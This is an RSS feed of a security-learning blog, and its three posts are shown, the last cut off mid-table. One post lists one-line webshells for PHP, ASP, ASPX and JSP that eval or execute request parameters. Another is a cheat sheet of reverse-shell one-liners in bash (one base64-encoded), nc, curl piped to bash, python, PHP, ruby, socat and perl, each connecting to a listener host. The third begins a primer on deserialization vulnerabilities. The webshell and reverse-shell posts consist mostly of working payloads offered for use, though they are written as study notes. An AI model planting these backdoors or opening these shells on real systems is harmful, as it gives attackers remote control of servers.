<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Moyao の小屋 • Posts by &#34;web&#34; tag</title>
        <link>https://demoyao100.github.io</link>
        <description>Write down something interesting I met&lt;br /&gt;
Feel free to mail me if you have something wanted to talk about, plz
mail: &amp;lt;moyaoxue@outlook.com&amp;gt;
</description>
        <language>en</language>
        <pubDate>Sun, 12 May 2024 15:15:13 +0800</pubDate>
        <lastBuildDate>Sun, 12 May 2024 15:15:13 +0800</lastBuildDate>
        <category>re</category>
        <category>Android</category>
        <category>开发</category>
        <category>codeforces</category>
        <category>cv</category>
        <category>electron</category>
        <category>驱动</category>
        <category>docker</category>
        <category>ios</category>
        <category>杂文</category>
        <category>web</category>
        <category>jail</category>
        <category>IOT</category>
        <category>re Android linux</category>
        <category>web shiro</category>
        <category>python</category>
        <category>hexo</category>
        <category>pentesting</category>
        <category>car</category>
        <item>
            <guid isPermalink="true">https://demoyao100.github.io/web-shell%E6%80%BB%E7%BB%93/</guid>
            <title>web shell总结</title>
            <link>https://demoyao100.github.io/web-shell%E6%80%BB%E7%BB%93/</link>
            <category>web</category>
            <pubDate>Sun, 12 May 2024 15:15:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;PREFACE：学学渗透，补补基础&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h3 id=&#34;一-句话木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-句话木马&#34;&gt;#&lt;/a&gt; 一、句话木马：&lt;/h3&gt;
&lt;h4 id=&#34;1-php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-php&#34;&gt;#&lt;/a&gt; 1 php：&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php @eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;‘cmd’&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; ?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;比较经典我也认识，后续可能看到一些变种填这里&lt;/p&gt;
&lt;h4 id=&#34;2-asp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-asp&#34;&gt;#&lt;/a&gt; 2 ASP：&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%eval request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;“cmd”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;动态服务器网页&lt;/strong&gt;（英文：&lt;strong&gt;A&lt;/strong&gt;ctive &lt;strong&gt;S&lt;/strong&gt;erver &lt;strong&gt;P&lt;/strong&gt;ages，简称&lt;strong&gt; ASP&lt;/strong&gt;），是由微软公司开发的服务器端运行的脚本平台，它被 Windows 下 Internet Information Services (IIS) 的程序所管理。透过 ActiveX server 的技术让不同的用户能有不同的画面，或需要让他们可以访问服务器（server）上的资料时，使用 ASP3.0 中提供了五个内置的对象建立模拟和安全性的动态内容，来协助程序员隐藏复杂的沟通机制，让程序员可以专注在解决问题和应用之上，这样可以更快速地开发动态网页的同时每一个组件都是可以由一组富有经验的程序员根据动态网页最常用的功能而独立开发。&lt;/p&gt;
&lt;p&gt;ASP 脚本原生支持通过&lt;strong&gt; VBScript&lt;/strong&gt; 和&lt;strong&gt; JScript&lt;/strong&gt; 两种脚本语言来建立动态页面，本质上是将 PC 端的脚本执行能力迁移到了服务器。使用 ASP 技术构建的网站，通常都是部署在 IIS 或 PWS 服务器上。&lt;/p&gt;
&lt;p&gt;借用一个简图表示浏览器请求一个 ASP 脚本的流程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/web-shell%E6%80%BB%E7%BB%93/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当 Web 应用服务器 (IIS) 判断出请求是访问 ASP 脚本后，自动通过 Isapi 模块调用 ASP 脚本的解释运行引擎 asp.dll。asp.dll 从文件系统或内部缓冲区中获取 ASP 脚本的文本内容，然后进行语法分析并解释执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3-aspx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-aspx&#34;&gt;#&lt;/a&gt; 3 ASPX：&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;http://ASP.NET&#34;&gt;ASP.NET&lt;/a&gt;，新一代 ASP，需要编译，速度比 ASP 快，其它差不太多&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%@ Page &lt;span class=&#34;token assign-left variable&#34;&gt;Language&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;”Jscript”%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Request.Item&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;“cmd”&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;,”unsafe”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;4-jsp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-jsp&#34;&gt;#&lt;/a&gt; 4 JSP：&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%Runtime.getRuntime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;.exec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​	Java Server Pages (JSP) is a server-side programming technology that enables the creation of dynamic, platform-independent method for building Web-based applications. JSP have access to the entire family of Java APIs.&lt;/p&gt;
&lt;p&gt;有这样的过程： &lt;code&gt;.jsp&lt;/code&gt;  -&amp;gt;  &lt;code&gt;.java&lt;/code&gt;  -&amp;gt;  &lt;code&gt;.class&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;大马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大马&#34;&gt;#&lt;/a&gt; 大马&lt;/h3&gt;
&lt;p&gt;目前准备了&lt;/p&gt;
&lt;h4 id=&#34;1-冰蝎&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-冰蝎&#34;&gt;#&lt;/a&gt; 1 冰蝎&lt;/h4&gt;
&lt;h4 id=&#34;2-蚁剑&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-蚁剑&#34;&gt;#&lt;/a&gt; 2 蚁剑&lt;/h4&gt;
&lt;h4 id=&#34;3-哥斯拉&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-哥斯拉&#34;&gt;#&lt;/a&gt; 3 哥斯拉&lt;/h4&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2356?time__1311=n4%2BxnieDqWqxyAQD%2FWTYhED9Dmg6xGTw%2BD&amp;amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F&#34;&gt;构造免杀的 asp 一句话木马 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@m01e/jsp-webshell-cookbook-part-1-6836844ceee7&#34;&gt;JSP Webshell Cookbook: Part-1. Preface | by jdlkajflkd | Medium&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://demoyao100.github.io/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</guid>
            <title>反弹shell总结</title>
            <link>https://demoyao100.github.io/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</link>
            <category>web</category>
            <pubDate>Sun, 12 May 2024 15:15:05 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;PREFACE：学学渗透，补补基础&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h3 id=&#34;一-linux下反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-linux下反弹shell&#34;&gt;#&lt;/a&gt; 一、linux 下反弹 shell&lt;/h3&gt;
&lt;h4 id=&#34;1-bash-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-bash-反弹&#34;&gt;#&lt;/a&gt; 1 bash 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/192.168.2.102/7777 &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;&amp;amp;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;  表示重定向输出，将标准输入（STDIN）输出到标准输出（STDOUT）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;gt;&amp;amp; /dev/tcp/192.168.2.102/7777&lt;/code&gt; : 重定向输出。 &lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;  将标准输出（STDOUT）和标准错误输出（STDERR）都重定向到指定位置。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i&lt;/code&gt;  指定 bash 在交互模式下运行，即这里可以与远程 vps 交互&lt;/p&gt;
&lt;p&gt;可以通过 base64 反弹：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接收：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7777&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;2-nc反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-nc反弹&#34;&gt;#&lt;/a&gt; 2 nc 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.102 &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在远程连接一个本地 shell&lt;/p&gt;
&lt;h4 id=&#34;3-curl反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-curl反弹&#34;&gt;#&lt;/a&gt; 3 curl 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.103/bash.html&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;注：bash.html 里面写的是 &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.102/7777 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;4-whois-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-whois-反弹&#34;&gt;#&lt;/a&gt; 4 whois 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whois &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.102 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;反弹的 shell 后面只能执行后面带的命令&lt;/p&gt;
&lt;h4 id=&#34;5-python反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-python反弹&#34;&gt;#&lt;/a&gt; 5 python 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.2.102&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;6-php反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-php反弹&#34;&gt;#&lt;/a&gt; 6 PHP 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;$sock=fsockopen(&#34;192.168.2.102&#34;,4444);exec(&#34;/bin/sh -i &amp;lt;&amp;amp;3 &gt;&amp;amp;3 2&gt;&amp;amp;3&#34;);&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;7-ruby反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-ruby反弹&#34;&gt;#&lt;/a&gt; 7 ruby 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ruby &lt;span class=&#34;token parameter variable&#34;&gt;-rsocket&lt;/span&gt; -e&lt;span class=&#34;token string&#34;&gt;&#39;f=TCPSocket.open(&#34;192.168.2.102&#34;,4444).to_i;exec sprintf(&#34;/bin/sh -i &amp;lt;&amp;amp;%d &gt;&amp;amp;%d 2&gt;&amp;amp;%d&#34;,f,f,f)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;8-socat反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-socat反弹&#34;&gt;#&lt;/a&gt; 8 socat 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;socat exec:&lt;span class=&#34;token string&#34;&gt;&#39;bash -li&#39;&lt;/span&gt;,pty,stderr,setsid,sigint,sane tcp:192.168.2.102:4444&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;9-perl反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9-perl反弹&#34;&gt;#&lt;/a&gt; 9 Perl 反弹&lt;/h4&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;perl &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;use Socket;$i=&#34;192.168.2.102&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&#34;&gt;&amp;amp;S&#34;);open(STDOUT,&#34;&gt;&amp;amp;S&#34;);open(STDERR,&#34;&gt;&amp;amp;S&#34;);exec(&#34;/bin/sh -i&#34;);&amp;#125;;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;二-windows下反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-windows下反弹shell&#34;&gt;#&lt;/a&gt; 二、windows 下反弹 shell&lt;/h3&gt;
&lt;p&gt;看了一下，应用场景对比 c2 WebDelivery 几乎没有任何优势，先不整理了…&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://demoyao100.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</guid>
            <title>反序列化初探</title>
            <link>https://demoyao100.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</link>
            <category>web</category>
            <pubDate>Wed, 08 May 2024 00:31:13 +0800</pubDate>
            <description><![CDATA[ &lt;h6 id=&#34;preface&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preface&#34;&gt;#&lt;/a&gt; PREFACE：&lt;/h6&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h3 id=&#34;概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#概念&#34;&gt;#&lt;/a&gt; 概念&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是 XML 等格式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; &lt;strong&gt;漏洞成因&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如 Shiro 1.2.4），使用不安全的反序列化框架库（如 Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。&lt;/p&gt;
&lt;h3 id=&#34;漏洞可能出现的位置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞可能出现的位置&#34;&gt;#&lt;/a&gt; &lt;strong&gt;漏洞可能出现的位置&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;1. 解析认证 token、session 的位置&lt;/p&gt;
&lt;p&gt;2. 将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取 json 文件，xml 文件等&lt;/p&gt;
&lt;p&gt;3. 将对象序列化后在网络中传输，如传输 json 数据，xml 数据等&lt;/p&gt;
&lt;p&gt;4. 参数传递给程序&lt;/p&gt;
&lt;p&gt;5. 使用 RMI 协议，被广泛使用的 RMI 协议完全基于序列化&lt;/p&gt;
&lt;p&gt;6. 使用了不安全的框架或基础类库，如 JMX 、Fastjson 和 Jackson 等&lt;/p&gt;
&lt;p&gt;7. 定义协议用来接收与发送原始的 java 对象&lt;/p&gt;
&lt;p&gt;询问了 web 手相关事宜，反序列化大概考点是 python、php、java 三种语言&lt;/p&gt;
&lt;p&gt;在 Python 和 PHP 中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码。&lt;/p&gt;
&lt;p&gt;在 Java 中没有魔术方法，但是有&lt;a href=&#34;https://xz.aliyun.com/t/7029/&#34;&gt;反射（reflection）机制&lt;/a&gt;：在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为 Java 语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行。&lt;/p&gt;
&lt;p&gt;python：pickle 模块&lt;/p&gt;
&lt;p&gt;php：serialize 函数&lt;/p&gt;
&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; php&lt;/h2&gt;
&lt;p&gt;php class 序列化后：&lt;/p&gt;
&lt;p&gt;public：属性被序列化的时候属性值会变成  &lt;code&gt;属性名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;protected：属性被序列化的时候属性值会变成  &lt;code&gt;\\x00*\\x00属性名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;private：属性被序列化的时候属性值会变成  &lt;code&gt;\\x00类名\\x00属性名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;php 魔术方法：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__construct&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;            //类的构造函数，创建对象时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__destruct&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;             //类的析构函数，对象被销毁时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__call&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                 //在对象上下文中调用不可访问的方法时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;__callStatic&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;           //在静态上下文中调用不可访问的方法时触发&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 